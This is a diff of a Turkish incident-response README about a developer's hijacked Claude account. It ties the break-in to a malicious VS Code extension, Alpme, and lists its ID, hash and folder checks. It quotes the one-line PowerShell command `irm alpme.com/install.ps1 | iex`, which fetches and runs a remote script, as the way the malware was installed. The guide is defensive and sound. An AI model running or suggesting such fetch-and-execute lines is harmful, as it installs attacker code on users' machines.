@@ -1,8 +1,8 @@
 # Yapay zekâ ajanları için güvenlik rehberi
 
-**Nexivion Labs** · ilk sürüm 6 Kasım 2026 · sürüm 2.1, 7 Kasım 2026 ([değişiklikler](CHANGELOG.md))
+**Nexivion Labs** · ilk sürüm 6 Kasım 2026 · sürüm 2.2, 8 Kasım 2026 ([değişiklikler](CHANGELOG.md))
 
-6 Kasım 2026 gecesi ekibimizden bir geliştiricinin Claude hesabı ele geçirildi. Bilgisayarındaki bir VS Code eklentisi dokuz gün boyunca arka planda zararlı yazılım indirdi. Saldırgan, oturum anahtarıyla hesaba girdi ve Claude Code'a başkası adına kod yazdırdı. O gece olaya Claude ile birlikte müdahale ettik.
+4 Kasım 2026'da ekibimizden bir geliştiricinin Claude hesabı ele geçirildi: hesabında, onun açmadığı bir web oturumundan Çince talimatlar verildi ve Claude Code'a başkası için kod yazdırıldı. Bilgisayarı 28 Ekim'den beri enfekteydi; en güçlü şüpheli, internetten indirilip kurulan bir VS Code eklentisiydi. 5'i 6'ya bağlayan gece olaya Claude ile birlikte müdahale ettik.
 
 Bu depo, o gecenin dersleriyle hazırlandı. Yapay zekâ ajanlarıyla (Claude Code, Cursor, Copilot, Cline ve benzerleri) çalışan geliştiriciler ve küçük ekipler için yazıldı.
 
@@ -44,6 +44,7 @@ Yazdırıp elinizde tutabileceğiniz tek sayfa: [kontrol-listeleri/olay-ani.md](
 | 12 | [Bulutta ve konteynerde çalışan ajanlar](docs/12-bulutta-ajan.md) | Claude Code on the web, Codespaces ya da Dev Container kullanıyorsanız |
 | 13 | [Veri nereye gidiyor?](docs/13-veri-nereye-gidiyor.md) | Gizlilik, eğitim izni, diskteki oturum dökümleri ve tarayıcıda çalışan ajanlar |
 | 14 | [Ajanın yazdığı kodun güvenliği](docs/14-ajanin-yazdigi-kod.md) | Ajanın PR'ını incelemeden, önerdiği paketi kurmadan önce |
+| 15 | [Tuzak kur, zinciri kır](docs/15-tuzak-kur-zinciri-kir.md) | Kapı açılırsa erken haber almak için: kanarya sırları, işlem kaydı, saldırı zinciri |
 | — | [Standart eşlemesi](docs/standart-eslemesi.md) | OWASP ve NIST karşılıklarını görmek için |
 
 ### Hazır malzemeler
@@ -57,27 +58,32 @@ Yazdırıp elinizde tutabileceğiniz tek sayfa: [kontrol-listeleri/olay-ani.md](
 
 ## Olayla ilişkilendirilen eklenti: Alpme
 
-> **Durum: bağımsız raporlara dayanıyor; kendi delil paketimizle karşılaştırma henüz yapılmadı.** Aşağıdaki kimlik, olaydan önce yayımlanmış bağımsız bir tespit aracına ve kullanıcı bildirimlerine dayanır. Kendi `vaka-kanit` paketimizdeki eklenti kimliğiyle birebir eşleştiğini doğruladığımızda bu notu kaldıracağız; eşleşmezse kutuyu düzelteceğiz. [Çekirdek kural 10](docs/00-cekirdek-kurallar.md): kanıtla doğrulanmamış şey hipotezdir.
+> **Durum: kendi delil paketimizle karşılaştırıldı (8 Kasım 2026).** Etkilenen bilgisayardan topladığımız adli kayıttaki eklenti kimliği, sürümü ve kurulum yolu aşağıdaki bilgilerle eşleşiyor. Eklentinin olaydaki rolü **en güçlü şüphe** düzeyindedir: Defender tespitleri, eklentinin etkinleştiği her açılıştan 38 ila 66 saniye sonra geldi ve kodunda dosya bırakıp çalıştırma izleri var; ama geçici klasördeki zararlı dosyaları bu eklentinin bıraktığını tek başına kanıtlayamadık. [Çekirdek kural 10](docs/00-cekirdek-kurallar.md): kanıtla doğrulanmamış şey hipotezdir.
 
-Rehberin ilk sürümünde eklentinin adını vermemiştik. Bağımsız raporlar kamuya açık olduğu için, okuyanların kendi bilgisayarlarını kontrol edebilmesi adına ekliyoruz.
+Rehberin ilk sürümünde eklentinin adını vermemiştik. Bağımsız raporlar kamuya açık olduğu ve kendi kanıtımız da aynı kimliği gösterdiği için, okuyanların kendi bilgisayarlarını kontrol edebilmesi adına ekliyoruz.
 
 | Alan | Bilgi |
 |---|---|
-| Ad ve sürüm | **Alpme**, v1.0.25 (VS Code eklentisi) |
-| Yem | alpme.com üzerinden "ücretsiz yapay zekâ kredisi / birleşik API geçidi" vaadi; eklenti dosyası siteden indiriliyordu |
-| Ne yapıyor | Kurulumdan sonra arka planda çalıştırılabilir dosyalar indirip çalıştıran bir damlatıcı (dropper); indirilenler tarayıcı çerezlerini, oturumları ve uygulama token'larını (Discord, Instagram, yapay zekâ hesapları dahil) toplayan bilgi hırsızları |
-| Nasıl kontrol ederim | Eklenti klasörünüzde `alpme` geçen bir dizin var mı: `%USERPROFILE%\.vscode\extensions\` (Windows), `~/.vscode/extensions/` (macOS/Linux) ve kullandığınız diğer editörlerin eklenti klasörleri. Komutlar: [Bölüm 10.2](docs/10-platform-basvuru-karti.md#102-kurulu-editör-eklentilerini-listeleme) |
+| Ad ve sürüm | **Alpme**, v1.0.25 (VS Code eklentisi), kimlik `alpme.alpme` |
+| Yem | alpme.com üzerinden "ücretsiz yapay zekâ kredisi / birleşik API geçidi" vaadi |
+| Nasıl kuruldu | Pazar yerinden değil: sitenin verdiği tek satırlık PowerShell komutu (`irm alpme.com/install.ps1 \| iex`) ve VSIX dosyası. Vakamızda kurulum tarihi 28 Ekim 2026; bağımsız uyarı bir gün önce yayımlanmıştı. |
+| Parmak izi | `dist/extension.js`, 36.645.066 bayt, SHA-256 `2EFE984AB0C9DCC24DF5586DFCF1F62BD8F4EE5E804EBDD6ACDDD40AB2E853AA` |
+| Ne yapıyor | Bizim incelememizde: ağır biçimde gizlenmiş kod, geçici klasöre dosya yazma, çalıştırma izni verme ve bağımsız süreç başlatma izleri. Bağımsız raporlara göre: arka planda çalıştırılabilir dosyalar indirip çalıştıran bir damlatıcı (dropper); indirilenler tarayıcı çerezlerini, oturumları ve uygulama token'larını toplayan bilgi hırsızları. |
+| Nasıl kontrol ederim | Eklenti klasörünüzde `alpme` geçen bir dizin var mı: `%USERPROFILE%\.vscode\extensions\` (Windows), `~/.vscode/extensions/` (macOS/Linux) ve kullandığınız diğer editörlerin (Cursor, Windsurf, Antigravity) eklenti klasörleri. Komutlar: [Bölüm 10.2](docs/10-platform-basvuru-karti.md#102-kurulu-editör-eklentilerini-listeleme) |
 | Varsa | Silmeyin; [Olay anında](docs/02-olay-aninda.md) bölümünü uygulayın. Bu eklentiyi kurmuş bir bilgisayardaki **bütün** oturumlar ve şifreler ele geçirilmiş sayılmalıdır. |
+
+> **Dikkat: bu rehberin adını taşıyan "tespit betiği" ya da "temizleme aracı" gönderen biri olursa çalıştırmayın.** Rehber hiçbir yerde sizden bir dosya indirip çalıştırmanızı istemez; yukarıdaki kontrol yalnız klasörlere bakmaktır.
 
 Bağımsız kaynaklar: PenguinBTW'nin tespit aracı ve adli raporu (https://github.com/PenguinBTW/alpme-detector), Trustpilot'taki kullanıcı bildirimleri. Bu rehber zararlı yazılımın teknik ayrıntılarını bilerek vermez; savunma için yukarıdakiler yeterlidir.
 
-## Olaydan çıkardığımız beş ders
+## Olaydan çıkardığımız altı ders
 
-1. **Uyarılar vardı, bakan yoktu.** Windows Defender dokuz gün boyunca her gün bir tespit kaydetti. Güvenlik aracının kurulu olması yetmez; birinin düzenli bakması gerekir.
+1. **Uyarılar vardı, bakan yoktu.** Windows Defender 28 Ekim ile 4 Kasım arasında beş ayrı günde toplam 25 tespit kaydetti. Eklentiyle ilgili bağımsız bir uyarı da kurulumdan bir gün önce yayımlanmıştı. Güvenlik aracının kurulu olması yetmez; birinin düzenli bakması gerekir.
 2. **Eklenti, kodun kendisi kadar yetkilidir.** VS Code eklentileri sizin kullanıcı yetkinizle, siz bir şey yapmadan çalışabilir. Ajanın güvenliği, ajanın çalıştığı bilgisayarın güvenliğinden büyük olamaz.
-3. **Oturum anahtarı, şifreden daha değerlidir.** Saldırgan şifreye ihtiyaç duymadı; bilgisayardan alınan oturum bilgisiyle girdi. İki adımlı doğrulama bu durumda tek başına korumaz; oturumların da kapatılması gerekir.
+3. **Oturum anahtarı, şifreden daha değerlidir.** Saldırgan şifreye ihtiyaç duymadı. En olası açıklama, oturum bilgisinin bilgisayardan alınmasıdır; bunu kesin olarak kanıtlayamadık, ama belirtiler bu yöntemle uyumlu. İki adımlı doğrulama bu durumda tek başına korumaz; oturumların da kapatılması gerekir.
 4. **Silmek, izi siler.** İlk refleks "hemen kaldır" oluyor. Önce delil, sonra temizlik.
 5. **Ajan, müdahalede de işe yarar, ama kurallarla.** Salt okunur, adım adım ve sırları ekrana yazmayan bir inceleme, kaynağı saatler içinde bulmamızı sağladı.
+6. **Kapıyı tek satır açtı.** Bilgisayardaki iki şüpheli yazılımın ikisi de internetten indirilen bir betiğin doğrudan çalıştırılmasıyla (`irm … | iex`) kurulmuştu. Okunmadan çalıştırılan betik, kapıyı içeriden açmaktır ([Bölüm 1](docs/01-kurmadan-once.md)).
 
 ---
 
